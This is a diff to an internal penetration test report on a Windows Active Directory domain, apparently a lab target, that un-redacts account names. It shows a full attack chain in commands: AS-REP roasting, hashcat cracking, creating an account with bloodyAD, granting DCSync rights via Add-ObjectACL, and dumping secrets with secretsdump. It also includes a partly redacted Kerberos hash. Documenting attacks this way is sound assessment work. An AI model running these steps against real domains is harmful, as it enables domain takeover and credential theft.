@@ -6,8 +6,7 @@
 | **Target Environment** | Active Directory — Windows Server 2016 |
 | **Report Status** | Final |
 | **Assessment Type** | Infrastructure / Internal Network Penetration Test |
-| **Tester** | `<Your Name>` |
-| **Date** | `<Date>` |
+
 
 ---
 
@@ -68,7 +67,6 @@ Compromise of the KRBTGT account enables the creation of **Golden Tickets**, pro
 | **In-Scope Target** | `<target-ip>` |
 | **Domain** | `<redacted>` |
 | **Assessment Type** | Black Box — No credentials provided at start |
-| **Testing Window** | `<date range>` |
 | **Out of Scope** | Denial of Service, Physical Access, Social Engineering |
 | **Authorisation** | Written authorisation obtained prior to testing |
 
@@ -196,8 +194,8 @@ GetNPUsers.py <redacted-domain>/ -usersfile users.txt -dc-ip <target-ip> -no-pas
 ```
 
 ```text
-$krb5asrep$23$svc-<redacted>:0bc62f49bf3a967469687aea530f2d59$183580b8d285f569f49be3
-de3770c7f59c9029f8b19392a5844<redacted>916e4a1f
+$krb5asrep$23$svc-alfresco:0bc62f49bf3a967469687aea530f2<redacted>d59$183580b8d285f569f49be3
+de3770c7f59c9029f8b19392a5844916e4a1f
 ```
 
 #### Business Impact
@@ -233,7 +231,7 @@ hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```text
-svc-<redacted> : <redacted>
+svc-alfresco : <redacted>
 ```
 
 #### Business Impact
@@ -278,25 +276,25 @@ svc-alfresco
 New attacker-controlled account created via delegated privileges:
 
 ```bash
-bloodyAD --host <target-ip> -d '<redacted-domain>' -u '<redacted-user>' \
-  -p '<redacted-password>' add user '<redacted-user>' '<redacted-password>'
+bloodyAD --host <target-ip> -d '<redacted-domain>' -u 'svc-alfresco' \
+  -p '<redacted-password>' add user 'NewUser' '<redacted-password>'
 ```
 
 ```text
-[+] <redacted-user> created
+[+] NewUser created
 ```
 
 Attacker-controlled account added to Exchange Windows Permissions:
 
 ```bash
-bloodyAD --host <target-ip> -d '<redacted-domain>' -u '<redacted-user>' \
+bloodyAD --host <target-ip> -d '<redacted-domain>' -u 'svc-alfresco' \
   -p '<redacted-password>' add groupMember \
   'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=<redacted>,DC=<redacted>' \
-  '<redacted-user>'
+  'NewUser'
 ```
 
 ```text
-[+] <redacted-user> added to CN=Exchange Windows Permissions
+[+] NewUser added to CN=Exchange Windows Permissions
 ```
 
 #### Business Impact
@@ -330,8 +328,8 @@ By leveraging `WriteDACL` permissions on the domain object via Exchange Windows 
 
 ```powershell
 $pass = ConvertTo-SecureString '<redacted-password>' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential('<domain>\<redacted-user>', $pass)
-Add-ObjectACL -PrincipalIdentity <redacted-user> -Credential $cred -Rights DCSync
+$cred = New-Object System.Management.Automation.PSCredential('<domain>\NewUser', $pass)
+Add-ObjectACL -PrincipalIdentity NewUser -Credential $cred -Rights DCSync
 ```
 
 | Permission Granted | Description |
@@ -373,7 +371,7 @@ With directory replication rights granted, a DCSync attack was performed using I
 #### Evidence
 
 ```bash
-secretsdump <redacted-domain>/<redacted-user>@<target-ip>
+secretsdump <redacted-domain>/NewUser@<target-ip>
 ```
 
 ```text
@@ -462,7 +460,7 @@ Each discovered account was tested for the `UF_DONT_REQUIRE_PREAUTH` flag. The s
 Authenticated BloodHound collection was performed using the recovered credentials to map the domain's privilege relationships.
 
 ```bash
-bloodhound-python -d <redacted-domain> -u <redacted-user> -p '<redacted-password>' \
+bloodhound-python -d <redacted-domain> -u svc-alfresco -p '<redacted-password>' \
   -dc <redacted-domain-controller> -ns <redacted-ip> -c All
 ```
 
@@ -485,7 +483,7 @@ Leveraging the delegated privileges identified in BloodHound (FIND-04):
 **Step 3** — DCSync rights were granted to the attacker-controlled account by modifying the domain object's ACL (FIND-05).
 
 ```powershell
-Add-ObjectACL -PrincipalIdentity <redacted-user> -Credential $cred -Rights DCSync
+Add-ObjectACL -PrincipalIdentity NewUser -Credential $cred -Rights DCSync
 ```
 
 ---
@@ -512,10 +510,10 @@ With replication rights in place, `secretsdump` was used to perform a DCSync att
 ## 8. Appendix
 
 ### A — BloodHound Attack Path
+![Bloodhound_Attack_Path](image/bloodhound_start.png)
+![BloodHound Attack Path](images/bloodhound_1.png)
 
-![BloodHound Attack Path](images/bloodhound_redacted.png)
-
-*Figure 1: BloodHound graph showing the privilege escalation path from svc-alfresco to domain compromise via Exchange Windows Permissions WriteDACL abuse.*
+*Figure 1,2: BloodHound graph showing the privilege escalation path from svc-alfresco to domain compromise via Exchange Windows Permissions WriteDACL abuse.*
 
 ---
 
